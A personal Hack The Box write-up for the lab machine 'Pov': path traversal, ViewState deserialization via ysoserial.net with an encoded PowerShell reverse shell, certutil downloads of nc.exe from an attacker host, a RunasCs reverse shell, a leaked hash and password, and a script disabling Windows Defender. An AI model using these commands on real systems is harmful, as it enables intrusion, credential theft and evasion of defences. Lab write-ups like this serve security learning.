# Savage-Lands : Pov Writeup

Name: Pov
Date:  3/2/2024
Difficulty:  Medium
Goals:  
- Tryharder with teammates Implement the Hierarchy - SUCCEEDED 
	- I have never exploited ViewState so I am not fussed about needing guidance in that part
	- Privilege Escalation was all me except I tried too hard without metasploit.
Learnt:
- ViewState hacking
- SeDebugPrivilege script is not that good and meterpreter is just a faithful friend
Beyond Root:
- ViewState update notes
- Update my exfiltration private all in one cheatsheet

Tryharder with teammates Hierarchy of information:
- Simple methods (always go full xct What is simplest way to do this? Not how is it suppose to be done) 
- Escalate simple methods till..
- Known complex methods & Known team mate good instruction
- Team mates methods
- My creative methods

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Pov/Screenshots/ping.png)

Domain name and email provided:
![](userandemailformatandvhostincontactus.png)

nikto: aspnet version 
![](niktoaspnetversion.png)

Gospider finds the vhosted subdomain:
![](devvhostandaosjs.png)

The developers dev version of his portfolio
![](devvhost.png)

Stephen Fitz bio:
![](downloadthecv.png)

JAvascript `_doPostGBack('download',")` is weird as there is no closing: `"`  - mistake this is even worse - no arguement is provided to `''`
![1080](filereadswithdownloadmaybe.png)

Graphs with metric make me a sad person
![](graphswithoutmetricsismeaningless.png)

Fake comments and likes! Stephen has some nerve!
![](voidlinksandbadstats.png)

Why is this on `127.0.0.1:8080` - reverse proxy 
![](port8080somewhere.png)

Checking the metadata of the CV:
![](Turbotheautorinthepdfmetadata.png)

Pretty sure my memory is littered with the PDF CVEs I heard about in 2023 
![](turboissoftware.png)

Attempting XSS for the contact form:
![1080](getintouchHACKEDxss.png)
The first of many aspxerrorpath 
![1080](defaulterrorpath.png)
A default "redirect" that is hardcoded default path back to the main page - understanding the error handling of a dev page is important given that it is consider not production ready - so how ready is it?![](seconddefault.png)
And the result:
![](backtosteveyfritzmainpage.png)

The 302  redirect
![](the302redirect.png)

Trying path traversal in the viewstate - `..\` to `..\..\..\..\..\..\..\..\..\`
![](manualpathtraversalleadtonofile.png)

Returning to the application the reverse proxy setup harmed an easy recursively download all the pages to be then analysed by Snyk
![](recursivepain.png)


As per my current objectives on getting better and improving my methodology till this is utterly effortless so I can move forward more:
- Stop - Assess:
	- Decision one: Recon in the background
	- Decision GoJuggular: I think that that download functionality is vulnerable 
		- I need more DevTools and Javascript exposure 
			- Before that dork `__doPostBack('download','')`
				- `aspalliance[.]com/articleViewer.aspx?aId=895&pId=-1` - not secure site 
				- 2 arguments
					- eventTarget - download
					- eventArgument - which is `''`
			- Look at the request again 

-  Backup plan
	- Is there a view state vulnerability
	- Team Mates

```bash
feroxbuster --url 'http://dev.pov.htb/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  -r -A --rate-limit 100 -o feroxbuster/rmwl-dev-base.feroxbuster
```

Dorked `-htb __doPostBack js`
![](aspallianceisnotsecuredotcom.png)

It could be that the feature is not complete and `file=` is a argument that is not actually implemented, but would be? 
![](notcompletedfeaturemayreqfordownload.png)

Empty file parameter and noticing the `&=`
![](validatingfileparambeingnotimplemented.png)

- https://github.com/tjomk/wfuzz/blob/master/wordlist/fuzzdb/attack-payloads/path-traversal/path-traversal-windows.txt

![1080](fuzzforfileintheeventtargetattempt1.png)

- https://zsecure.uk/blog/windows-path-traversal-lfi-wordlist/

Use AI to read bad pages while remember the Black Hat talk about AI vulnerabilities that has basically utter demolished the idea of using one personally given the insanely cool vulnerabilities for the future give it 5 years to secure those and it will still be very bad.. 
![](howdoespostbackworkPHIND.png)
## Exploit

So after some consideration on how to proceed that is best for my growth: I decide to finally check on the team discord. I have never exploited VIEWSTATE and found a reference to Perspective from HTB and ysoserial.net with wine to exploit the viewstate. Perspective is a grand tour of exploiting ASP(x) web applications. It is now on the list of CTF, Agile, Arkam and now Perspective Helped-Thorough that have accumulated during this first month of the fourth season of HTB seasons. This is good for revising and retaining long term understanding over the last four boxes - each web application vulnerability type except one was one I have not done. I had access to the entire chain to complete the machine, but decided that I wanted the privilege escalation for myself this afternoon/evening and I want to find the web.config. No explanation of the path traversal was available. And the Privilege escalation may have something do with credentials. Basically I was on the correct vulnerablility
- the issue is the Wordlist issue that crops up every year.
- Dealing with redirects in burpsuite repeater and ffuf - is oof

Pause and reset to the calm hacking mind of getting it done:
![](theispdfiscomewith.png)

- It will always download this the cv.pdf if either:
	- `__EVENTARGUMENT` is empty
	- `file=` is not required 

There is both exploitation with and without, but the path traversal to view the web.config to get keys means we have it alot easier
![](sherlockholmwithseriousdebufftobrainbuttherelief.png)

https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret

Windows machine is best way - wine was a trouble for my teammates to configure
```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="" --validationalg="SHA1" --validationkey="
 --path="/portfolio/default.aspx" --apppath="/" -c "PASTE PAYLOAD HERE"

# The :8080 is the reverse proxy used, but is not required as we do not get response 
ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
 --path="/portfolio/default.aspx" --apppath="/" -c "PASTE PAYLOAD HERE"

.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio/default.aspx" --apppath="/" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAwACcALAA4ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" 
```

And 
![](payloadcreatedysonet.png)

This OUR viewstate we paste in:
```powershell
6auMMrcH3QnwgIDqUj4JGeBR33IFrooVePoz7PsoiboI%2F7RPWNQxB2ZQUCkd51o6a2lbVinj9qElOzilOvuFV0woRlT%2BLbNzTvbceihPIFGrt5Okb%2FrGe8dCzqQlWydSq%2BJublOvH4UJAhimZXvb8g2Fq3Hux5Pyy2MDvlW0XXGRB5RqYAxvSWG5Yp4hCvM5Hcb%2BEw7MMoT3SLW8qu9o4NUX9Xk7prQtfQ%2FF8ZquSZLEmZEJUI4TTHOmBvUqTRS2XJoTcJ9cUCozFTS3fkNkcQYtb0R7T8yHkh133cwXJll3HhOKftbjdAhz66JhZ8XgiwHYbBFAOrUrvptEk6uZ4vXgxQetc%2FwWb8eSP%2B7KRWDCRGhtKtXkpkM4t2l6klPl1KsY5x2yYaMmFLUAd%2BCxrmejpDnAx8rix2CNK2gZZYLZoBSINvxcczABSIlZzzNoMJ16yfacXkQXBJhoMzbQgsdny8P0t%2BPLan2CH7M3FeQnJeNK3XhVx1SUtJ96ONZ9PkePy2193TAmg%2FSSW65gJ2E%2FynL6up1TcVtaqT0NWRv5YcF1QDElYsOTrMUduYS1LJ715N24hGCcqAITfhEw0yJ1WBTNbpmw1wY1GC6dNJ4o7ULj8K%2B323bTwVcXS1tyxCuSKwd6zKJ39q3fZCDn%2FanLintDincIpbNyP6BVwqxc51b0DJj2%2FpqgUfXFI797Xof%2BxY38LdCNasKoRPRCZMvuvI53Vms4Os7maXpjdVKoxjnahK7n4cUdW3BlmVzSlBfk%2BW%2BPzPouf3dcXhml8kDtDoX28bh84qnCKKc3si4PwyW9ly3bjRhszxnMo8X46GHiNsDIwXdFlUD7ZXwoaPz45hwijN3nZj%2BIcK5C6q3TKBlaeRzNcPB%2BwdIxeYs36ALZmJ16UbOhR7vzCx%2BbjV7nCubrVaHMnFDXOGkxZsy%2BJLdwz%2BFNm5JJ8vtZ%2FHifY3SyD5JIGzUQiwL%2BGGBmTExkhpNPJP4Zw8mUXWA1C8J3bImbSQ0mfMA2pJXXvtmAA%2BCxVQIPdrw5pISUDoKajjiotHV343z%2FbH%2B%2FpTzikCeifG%2BNfVBbdSajl2FuyLZ4FnkeTE1Res2MhH7WQnaGEtXSIc0JQ2ufB63Qm8SD98l64Dny690oq3nX0lDyx4Avz7yGQ8G4EcF9XJr5xzIvFo4CYA5o7KjE87xL1iOfRpM9HlV19dDkzQ6%2BRyo2L13xSJ39Or1X%2Fg3DSek%2BKtakE5oBsubl10iegV%2By%2FlNan0Vkrq5Upu9fZlS%2FKXD%2BhwEAnQTAfbtxcH%2FasU8PynwlNpAYWAIDOg7V03K9iNuNlg4kulaWdz8zNeoq6Y9RsdLOAINgiuJA1K3q0WEO64dZV0X9u6GjgPAkLR6JeaTpQedBaYBYj83FcpI%2F3FSVOXkmrxmXinuLIBabcg4%2BTEquVdagw2SYBHKMuSx7Gy0fSQYacqlNzDykCGj9kOt1hutxH2TroomAi4PUM4a%2B%2Bnk%2BwuKmkHfRkS7V3ukWAIwMnOSIVFlWQYnsvz6c6v7IKcNOJwcSIN%2Fv67g9xgiimLZ%2FOlpV5GlXNa07SAhVc9zuRuPp6EE3CbN12MsNBcbqlP%2FFhU23Vl4fBdUm2vMpCiyNkWHR0NP6WNFC9pR%2FFEQmveEHZP2xM6IrbLv95qaGUmQbjihuNZSfpXGmCv84BuaiNm%2Bhdtg6uXyxgJjqJqMphlvxUkl%2B27dJWRWLrmJULM1y9VeiUdnoZXtHAprZ1GTowXYPmjkJn0TqLAgXkx%2BUSN2ROP5z6q3DIEB%2BHWW3uo6nIaw5dAedfvrjNguuf4sS1C9gbdRut6ywlFxXQCgusEW9oHipOthGQ83iEqFlqIOldKd2Rm7IDW%2BCsSvO28%2F41A%2FdShcJwgyAbWigQy7OVCTUebPk%2BZQJ1bHSeqM9Nv408g6FS2Tz84P4c6WZJYmIvbcleI9xTKevVFWWS6diuIptt0B8E1TiTiNQ1AnSUsDuE7v4iGQFaW90PQjC99gehUPLwqny5uSpdHHanSn9gamK8Yj8lVL7G0O7738%2Fxnx%2BozZ2Ou%2BZ61m8n%2BnkpJvpLDouqyNCmNgChar6NRygfjb2SwfifdHN1ioRGO4ph83fPQfAncVZwG6FBrfHY1L2G1ASwig%2B1Eykb828xPJP%2BmTzED%2F1biLVBbrdfVec%2FHK6Ko6g5Cd0YDiUeEf0WwmcgIM1G83j%2Fkrl9Z%2Fw36OYqpWPG4lCSupqxyEEU4ND1l7JigTIMKLv6US0n7eJEmgCDb4H8BTxMx8%2BDfEoYfj%2Bdr1mBTHZEXgWGYzJ53GRGGHaTJafHa6k92oWb%2BG5bCZ4PbGv%2FxrXeYWoYI8gpBwGx%2FUevgAc%2B%2FOMDF7%2BJ7mBxW3OKpUPfadc00Mp5gCXQwMMcwzjDywaH1aImW4zrVbv7HWEgW1FcDH7yN2cVSiO1FqPe4exT6TAUXdHPOcnJ%2FXcob2EuVqivZLOoXVBORqw9Pk3Z0Hf5wZVt%2FMedvB8fvIoMOwejjlTV9buAu4cozMPGWbriWO%2F9hLXuvKPsfMICvrqSUUIJBI5X3%2BkQlm2n%2FDd%2FlCCMz1IKJhHBac4Sz2ZBO7sFcxV%2FVVMoUPujacSizh29IpwuykD%2BZYBQnLI1kAc2tPa5EnScZNPmnqdhUdJVfKYBgTwKfdMWg73z9RVl6ShVE4zsaAlwYA%2F5vnGH6O0HVLImAPap3BVlVxjlAPb6QiDqp2g7Viz%2FGfdseh4Nyx81VIj%2F3%2B%2FW44qgPYhhaTfn7FyFP224WCLlNbk9R%2Bz7eLCTo58zs6iJ5VM5hsJMj%2BNILiMkywxR5Igj98mD4xwvT0nVNfiMqW3bhkAZ4aUcQ9nACLRy1Czmz8g19HDcb6gvJmjHr7FxRPZjjEVjf1zSLBY27fA3njTsGEjFp8baoun8Gx0U4ECGoML8mfBvdNzsFYVeACkKkifOyDJ7HkSCJtZeAdTlEVp9tb7WdSh7bUMn1%2Fhe3vZgZvhVQTPKtJMoWL3HAJakjAQ4eXQfFW4cbFz%2BEtJGvYfrJD7fosiK5zenhYac%2BkS9rCQzhISEDPgyTYNYxsIP7yMmvyxHU5XOdQpdA%3D%3D
```

And we now have a foothold
![](useronpov.png)
## Foothold

`alaading` 
![](usersonthepovmachine.png)
I ididnottakethispicturebecauseiwasthinkingflag YIKES! 
![](ididnottakethispicturebecauseiwasthinkingflag.png)

```c
sfitz::POV:aaaaaaaaaaaaaaaa:6144eb14296473ac197e739247d73090:010100000000000080f8af450056da01eeeeec320493f29f000000000100100047007200410074004b006e006a005a000300100047007200410074004b006e006a005a000200100077004a005300510041004b006d0052000400100077004a005300510041004b006d0052000700080080f8af450056da0106000400020000000800300030000000000000000000000000200000e6c9fca9b37a324000ef79969e67bc72b579dedfa562171ee4e9a5b414c8393e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340038000000000000000000
```
## Privilege Escalation

- alaading is enabled
- no LAPS, no LSA protection, no credguard
- no AV

`C:\inetpub\temp\apppools\dev\dev.config` - noting of interest
![1080](intersetingconfig.png)

![](lostofports.png)

Did my due diliegence, but I forgot the connection.xml 
```powershell
 # I cannot query whether the driver is there
 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

# No edge
 [!] CVE-2019-0841 : VULNERABLE
  [>] https://github.com/rogue-kdc/CVE-2019-0841
  [>] https://rastamouse.me/tags/cve-2019-0841/
# no Edge
 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1253 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2019-1253
  [>] https://github.com/sgabe/CVE-2019-1253

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1385 : VULNERABLE
  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

```

I checked team discord, it is definitely a password and I need to find it and decrypt it
![](ILOOKEDATTHIS.png)
It already found this file when got a shell and I did not screenshot because my brain was thinking flag.
```
C:\programdata> cat C:\users\sfitz\documents\connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

![](hacktricks.png)

And here is the copy and paste version:
```powershell
certutil -urlcache -f -split http://10.10.14.50/winPEASx64.exe
certutil -urlcache -f -split http://10.10.14.50/RunasCs.zip
certutil -urlcache -f -split http://10.10.14.50/nc.exe

$credential = Import-Clixml -Path 'C:\users\sfitz\documents\connection.xml'
$credential.GetNetworkCredential().password

.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\programdata\nc.exe 10.10.14.50 44443 -e cmd.exe"
```


f8gQ8fynP44ek1m3 
![](f8gQ8fynP44ek1m3.png)

And we escalate
![1080](alaadingiscompromised.png)

Disabled privileges meant I could reenable them without administrative priviliges.. so.. SeDebugPrivilege was the intended path
![](weneedthatrdp.png)

ENABLE THE PRIVILEGES:
![](machinepersistence.png)

Cehckign the group as to whether that was important
![](remotemanagementuser.png)

We have service control and considering dlls
![](rmgprivs.png)
- Requires RPCSS service 
![](scqcqueryServices.png)

Nothing in the registry for me to alter regarding services...
![](stubpathforbackdoorprivesc.png)
And I do not have the right to start that service
![](cannotenablethisservice.png)

ThOnking too hard about something that simple thunking will do: 
![](simplyknowingstuff.png)
...for the doing it this way and collecting the ways
![](dumpinglsasswithprocdump.png)

- Tried:
	- dumping lsass
	- getsyspriv.ps1 every possible variation - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege-3.1.9
		- https://github.com/decoder-it/psgetsystem
		- https://decoder.cloud/2018/02/02/getting-system/
		- https://book.martiandefense.llc/notes/network-security/windows-privesc/windows-user-privileges#sedebugprivilege
		- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege-3.1.9
	- metasploit getsystem with SeDebugPrivilege only works on x86
		- https://www.offsec.com/metasploit-unleashed/privilege-escalation/
	- setntml in mimkatz
	- Empire `Get-System -Technique Token -Verbose`

```powershell
certutil -urlcache -f -split http://10.10.14.50/rev.exe
certutil -urlcache -f -split http://10.10.14.50/met.exe
certutil -urlcache -f -split http://10.10.14.50/EnableAllTokenPrivs.ps1
certutil -urlcache -f -split http://10.10.14.50/psgetsys.ps1

tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM"
```

Was upset I could not do this without metasploit, but I am happy with me objective being complete
![](root.png)
## Post Root Reflection

- Objective complete on ignoring team progress till I have done my dues or rolling about in more success than before  
- I knew ViewState could be hacked and this is second ysoserial experience I needed this season so feel like I have got alto from this 
- CTFs are CTFS I ignored a screenshot early the made me waste time as sfitz user 
- Sometimes meterpreter is just the answer



wtf is https://github.com/daem0nc0re/PrivFu/blob/main/PrivilegedOperations/SeDebugPrivilegePoC/SeDebugPrivilegePoC.cs

## BeyondRoot

https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret

Understand ViewState exploits - https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net


Fix my exfiltration cheatsheets
https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration

SeDebugPrivilege - https://jsecurity101.medium.com/mastering-windows-access-control-understanding-sedebugprivilege-28a58c2e5314

The DefenderBlender
```powershell
#Requires -RunAsAdministrator

Write-Host "|) [- /= [- |\| |) [- /?   ]3 |_ [- |\| |) [- /?" -ForegroundColor Red
Write-Host "|) [- /= [- |\| |) [- /?   ]3 |_ [- |\| |) [- /?" -ForegroundColor Green
Write-Host "|) [- /= [- |\| |) [- /?   ]3 |_ [- |\| |) [- /?" -ForegroundColor Yellow
Write-Host "|) [- /= [- |\| |) [- /?   ]3 |_ [- |\| |) [- /?" -ForegroundColor Blue
Write-Host "|) [- /= [- |\| |) [- /?   ]3 |_ [- |\| |) [- /?" -ForegroundColor Magenta
Write-Host "|) [- /= [- |\| |) [- /?   ]3 |_ [- |\| |) [- /?" -ForegroundColor Cyan
Write-Host "|) [- /= [- |\| |) [- /?   ]3 |_ [- |\| |) [- /?" -ForegroundColor White


if ($PSVersionTable.PSVersion.Major -lt 4) {
    Write-Host "You are PowerShell with $PSVersionTable.PSVersion.Major - that is probably not a good idea"
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "Running as Administrator"
    } else {
        Write-Host "Not running as Administrator $PSVersionTable.PSVersion.Major - please try harder to escalate please"
        exit
    }
    
}

$userInput = Read-Host -Prompt 'Enter enable or disable'
if ($userInput -eq "enable") {
    $defendBool = $true
} elseif ($userInput -eq "disable") {
    $defendBool = $false
} else {
    Write-Host "Invalid input. Please enter either 'enable' or 'disable'."
    exit
}

if ($defendBool) {
    Write-Host "Windows Defender being is fully enabled."
    Set-MpPreference -DisableRealtimeMonitoring $false
    Set-MpPreference -DisableBehaviorMonitoring $false
    Set-MpPreference -DisableScriptScanning $false
    Set-MpPreference -DisableEmailScanning $false
    Set-MpPreference -MAPSReporting Advanced
    Set-MpPreference -SubmitSamplesConsent AlwaysPrompt
} else {
    Write-Host "Windows Defender being is fully disabled"
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableScriptScanning $true
    Set-MpPreference -DisableEmailScanning $true
    Set-MpPreference -MAPSReporting Disabled
    Set-MpPreference -SubmitSamplesConsent NeverSend
}
Get-MpPreference 
exit
```
## Gibberish that came from this...

The best part about this is that AI vulnerabilities is that is multiplicative of both goods and bads variables in whatever-the-total-calculation-of-all-human-activities-to-go-on is, which in simple idiot terms is that MIL industrial complex LLM are going to go the way of GPT-2 regardless and expense is not actually worth making of have them. All it takes is the poisoning of the data is some way and it and it is Ransomware in the backups nightmare all over again, but now the csv is GA-GILLIONS (insert appropriate value in here, because AI dev having issues with curating datafile is decades old problem - now MASSIVE security issue). 

Long story short. Never, NEVER invest in ANYTHING AI unless you and the company have infinite money, infinite HUMAN power to fix and secure everything, while REQUIRING infinite defence and infrastructure to host this stuff and being UNHACKABLE. Good luck and thanks for all the free Youtube AI lesson over the years. It will be the biggest waste of money and water in human history to produce the data and decision making equivalence of SLUDGE 